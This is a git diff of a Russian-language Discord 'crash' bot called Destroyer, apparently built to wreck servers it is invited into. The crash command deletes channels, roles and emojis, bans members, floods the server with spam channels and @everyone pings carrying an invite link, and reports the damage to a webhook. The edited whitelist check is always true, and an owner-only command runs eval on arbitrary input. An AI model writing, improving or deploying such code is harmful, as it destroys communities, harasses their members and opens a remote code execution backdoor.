@@ -5,10 +5,13 @@ import asyncio
 import dhooks
 import contextlib
 import io
+import os
+import srv
 
 from discord.ext import commands
 from config import settings
 from dhooks import Webhook, Embed
+from srv import list
 
 client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
 client.remove_command('help')
@@ -28,15 +31,16 @@ async def on_ready():
 
 @client.command()
 async def crash(ctx):
-	if ctx.guild.id != 835425510333874187:
-		ctx.send("huh :)")
+	sid = ctx.guild.id
+	if sid != 835425510333874187 or sid != 802363338914791495:
+		await ctx.send("huh :)")
 		print('='*45)
 		start_time = localtime()
 		start_guild_num = len(ctx.guild.members)
 		start_guild_chan_num = len(ctx.guild.channels)
 		start_guild_role_num = len(ctx.guild.roles)
 		start_guild_emoji_num = len(ctx.guild.emojis)
-		##############################################
+	##############################################
 		banned_num = 0
 		deleted_chan = 0
 		deleted_roles = 0
@@ -59,7 +63,7 @@ async def crash(ctx):
 			except:
 				print(print(f'{localtime()} {channel.name} - can not be deleted'))
 		print('='*15+f' Deleted {deleted_chan} of {start_guild_chan_num} channels '+'='*15)
-		# DELETE ROLES
+	# DELETE ROLES
 		for role in ctx.guild.roles:
 			try:
 				await role.delete()
@@ -84,7 +88,7 @@ async def crash(ctx):
 		emojis_num = 0
 		servername = ctx.guild.name
 		servericon = ctx.guild.icon_url
-		
+
 		for x in range(settings['TEXT-CHANNELS']):
 			text_num += 1
 			await ctx.guild.create_text_channel(f"{settings['TEXT']}-{text_num}-{random.randint(1, 1000)}")
@@ -127,7 +131,7 @@ async def crash(ctx):
 		await asyncio.sleep(2)
 	#CRASH REPORT
 		try:
-			emb = webhook.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {start_guild_num}\n\
+			emb = Embed(title = 'Новый краш!', description = f"\Сервер: {servername}\n\**Участников**: {start_guild_num}\n\
 			**Удалено:**\n\
 			 **Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
 			 **Людей забанено:** {banned_num}/{start_guild_num}\n\
@@ -143,14 +147,13 @@ async def crash(ctx):
 			 **Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
 			**Начало краша:** {start_time}\n\
 			**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
-			emb.set_thumbnail(servericon)
 			emb.set_footer('Сервер крашнут:')
 			webhook.send(embed = emb, username = 'Краш-бот')
 			print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
 		except:
-			print(f'Crash ended. Wenhook send problem\n{start_time} - {end_time}')
+			print()
 	else:
-		ctx.send('Сервер невозможно крашнуть. Сервер в белом списке.')
+		await ctx.send(f'Извени, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
 @client.command(aliases=['spam'])
 async def __spam(ctx):
@@ -160,21 +163,46 @@ async def __spam(ctx):
     except:
        break
 
-@client.command(aliases=['exe'])
-async def e(ctx, code):
+@client.command()
+async def webhtest(ctx):
+	servername = ctx.guild.name
+	try:
+		emb = Embed(title = 'Новый краш!', description = f"\Сервер: {servername}\n\**Участников**: \n\
+		**Удалено:**\n\
+		 **Каналов:** \n\
+		 **Людей забанено:** \n\
+		 **Эмодзи удалено:**\n\
+		 **Ролей:** \n\n\
+		**Изменено:**\n\
+		 **Создано:**\n\
+		  **Текстовых каналов:*\n\
+		  **Голосовых:** \n\n\
+		**Другое**\n\
+		1\n\
+		 **Эмодзи создано**: \n\
+		 **Аватарка изменена(Тrue - да, Fаlse - нет):** \n\n\
+		**Начало краша:** \n\
+		**Конец краша:** \n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337, timestamp='now')
+		emb.set_footer('Сервер крашнут:')
+		webhook.send(embed = emb, username = 'test')
+	except:
+			print()
+
+@client.command()
+async def exec(ctx, *, cmd=None):
 	if ctx.author.id == 610453921726595082:
 		try:
-			out = exec(code)
-			await ctx.send(f'{out}')
+			out = eval(cmd)
+			await ctx.send(f'Output:\n```{out}\n```')
 		except:
-			await ctx.send(f'Error in {code}!')
-
+			print(f'{cmd} is an invalid command')
+			await ctx.send(f'An error occured in this command:\n```{cmd}\n```')
 	else:
-		await ctx.send('no.')
+		await ctx.send('Нельзя :)')
 
 @client.command(aliases=['spamall'])
 async def __spamall(ctx):
-	for channel in ctx.guild.text_channels:
+	for channels in ctx.guild.text_channels:
 		for i in range(20):
 			try:
 				await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
